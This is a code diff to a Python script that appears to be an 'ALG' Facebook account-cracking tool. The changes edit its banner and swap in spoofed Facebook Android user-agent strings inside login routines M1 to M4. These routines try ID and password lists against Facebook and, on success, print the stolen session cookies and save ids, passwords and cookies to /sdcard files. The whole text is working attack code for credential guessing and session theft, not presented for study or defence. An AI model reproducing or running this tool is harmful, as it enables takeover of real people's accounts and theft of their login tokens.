@@ -160,26 +160,22 @@ def p(x):
 os.system('xdg-open https://www.youtube.com/@Arr1098')
 sys.stdout.write('\x1b]2; <[Algeria]>\x07')
 logo=(f"""\033[1;37m
-
-
-  \033[1;32m $$$$$$\  \033[1;32m$$\       $$$$$$\  
-   \033[1;31m$$  __$$\ $$ |     $$  __$$\ 
- \033[1;31m  $$ /  $$ |$$ |     \033[1;32m$$ /  \__|
-   $$$$$$$$ |$\033[1;31m$ |     $$ |$$$$\ 
-  \033[1;32m $$  __$$\033[1;31m |$$ |     $$ |\_$$ |
-   $$ |  $$ |$$ |   \033[1;32m  $$ |  $$ |
-   $\033[1;37m$ |  $$ |$$$$$$$$\\$$$$$$  |
-  \033[1;31m  \__|  \__|\________|\______/ 
-  
-                     \033[1;36m   (Algeria♡) 
-\033[1;32m═══════════════════════════════════════════════
-\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mFACEBOK \033[1;32m   .•  Algeria
-\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mGITHUB  \033[1;31m   •   ALG
+ d8888 888      .d8888b.  
+      d88888 888     d88P  Y88b 
+     d88P888 888     888    888 
+    d88P 888 888     888        
+   d88P  888 888     888  88888 
+  d88P   888 888     888    888 
+ d8888888888 888     Y88b  d88P 
+d88P     888 88888888 "Y8888P88  V8P\033[1;32m(Algeria♡) 
+\033[1;37m═══════════════════════════════════════════════
+\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mFACEBOK \033[1;37m: Algeria
+\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mGITHUB  \033[1;37m: Algeria
 \033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mSERVICE \033[1;37m: FREE
-\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mVERSION \033[1;37m: 0.2
-\033[1;32m══════════════════════════════════════""")
+\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mVERSION \033[1;37m: 0.5
+\033[1;37m══════════════════════════════════════""")
 def linex():
-    print('\033[1;32m══════════════════════════════════════')
+    print('\033[1;37m══════════════════════════════════════')
 def clear():
         os.system('clear')
         print(logo)
@@ -351,7 +347,7 @@ def M1(ids,names,passlist):
                                 fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                 fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                 fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/101.52.63.22;FBBV/30817830;FBDM/{density=1.6,width=1416,height=1855};FBLC/en_US;FBRV/49586579;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/8.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/51.0.0.11;FBBV/815658546;FBDM/{density=2.40861816061994,width=1467,height=9691};FBLC/en_US;FBRV/103160250;FBCR/3G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/Oppo Reno 3;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/55.0.1.3580;FBBV/81234569;FBDM/{density=1.5,width=770,height=1240};FBLC/en_GB;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/1.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.1.56.5;FBBV/234597027;FBDM/{density=1.0,width=880,height=1850};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/2.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.0.88;FBBV/96358768;FBDM/{density=2.0,width=770,height=1400};FBLC/en_US;FBRV/26457963;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1890_03;FBSV/1.1.1;FBOP/1;FBCA/armeabi-v8a:armeabi;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -397,16 +393,16 @@ def M1(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
-                                        print('\r\r\033[1;32m<[ALG-OK]> '+ids+'     ✅       '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m<[ALG-OK]> '+ids+' | '+pas+'\033[1;97m')
                                         #------[OK IDS]------#
-                                        print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
+                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                         open('/sdcard/ALG_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ALG_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         oks.append(ids)
                                         Elite(ids,pas,ckkk)
                                         break                          
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\033[1;34m<[ALG-CP]> '+ids+'     [✘]    '+pas+'\033[1;97m')
+                                                print('\r\r\033[1;34m<[ALG-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/ALG-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -446,7 +442,7 @@ def M2(ids,names,passlist):
                                 fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                 fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                 cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
-                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Davik/2.1.0 (linux; U; Android 11.0.1; Infinix Hot 40 Build/SKQ1.210216.001[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix Hot 40;FBSV/11;FBDM/{density=1.0,width=1080,height=720};]"
+                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/51.0.0.11;FBBV/815658546;FBDM/{density=2.40861816061994,width=1467,height=9691};FBLC/en_US;FBRV/103160250;FBCR/3G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/Oppo Reno 3;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/55.0.1.3580;FBBV/81234569;FBDM/{density=1.5,width=770,height=1240};FBLC/en_GB;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/1.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.1.56.5;FBBV/234597027;FBDM/{density=1.0,width=880,height=1850};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/2.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.0.88;FBBV/96358768;FBDM/{density=2.0,width=770,height=1400};FBLC/en_US;FBRV/26457963;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1890_03;FBSV/1.1.1;FBOP/1;FBCA/armeabi-v8a:armeabi;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -495,7 +491,7 @@ def M2(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
-                                        print('\r\r\033[1;32m<[INF-OK]> '+ids+'      ✅        '+pas+' | '+joined(uid)+'\033[1;97m')
+                                        print('\r\r\033[1;32m<[INF-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')
 #os.system("espeak -a 300 \"INF,  OK,  YOUCEF,  THANKS,  \"") 
                                         print("\033[1;34m <[BISCUT-🍪]> :\033[1;37m "+cookie)           
                                         open('/sdcard/ALG_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ALG_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
@@ -505,7 +501,7 @@ def M2(ids,names,passlist):
                                                                                   
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\033[1;34m<[INF-CP]> '+ids+'      [✘]      '+pas+'\033[1;97m')
+                                                print('\r\r\033[1;34m<[INF-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                 #open('/sdcard/INF-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)                                                 
                                                 break
@@ -544,7 +540,7 @@ def M3(ids,names,passlist):
                                 fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                 fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                 fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Davik/2.1.0 (linux; U; Android 4.0.1; Infinix Note 11 Build/RKQ1.21110.002[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix Note 11;FBSV/11;FBDM/{density=2.0,width=1280,height=720};]"
+                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/51.0.0.11;FBBV/815658546;FBDM/{density=2.40861816061994,width=1467,height=9691};FBLC/en_US;FBRV/103160250;FBCR/3G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/Oppo Reno 3;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/55.0.1.3580;FBBV/81234569;FBDM/{density=1.5,width=770,height=1240};FBLC/en_GB;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/1.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.1.56.5;FBBV/234597027;FBDM/{density=1.0,width=880,height=1850};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/2.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.0.88;FBBV/96358768;FBDM/{density=2.0,width=770,height=1400};FBLC/en_US;FBRV/26457963;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1890_03;FBSV/1.1.1;FBOP/1;FBCA/armeabi-v8a:armeabi;]"
                                 ua = random.choice(UBI())
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
@@ -638,7 +634,7 @@ def M4(ids,names,passlist):
                                 fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                 fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                 fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/51.0.0.11;FBBV/815658546;FBDM/{density=2.40861816061994,width=1467,height=9691};FBLC/en_US;FBRV/103160250;FBCR/3G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/Oppo Reno 3;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/55.0.1.3580;FBBV/81234569;FBDM/{density=1.5,width=770,height=1240};FBLC/en_GB;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/1.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.1.56.5;FBBV/234597027;FBDM/{density=1.0,width=880,height=1850};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/2.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.0.88;FBBV/96358768;FBDM/{density=2.0,width=770,height=1400};FBLC/en_US;FBRV/26457963;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1890_03;FBSV/1.1.1;FBOP/1;FBCA/armeabi-v8a:armeabi;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
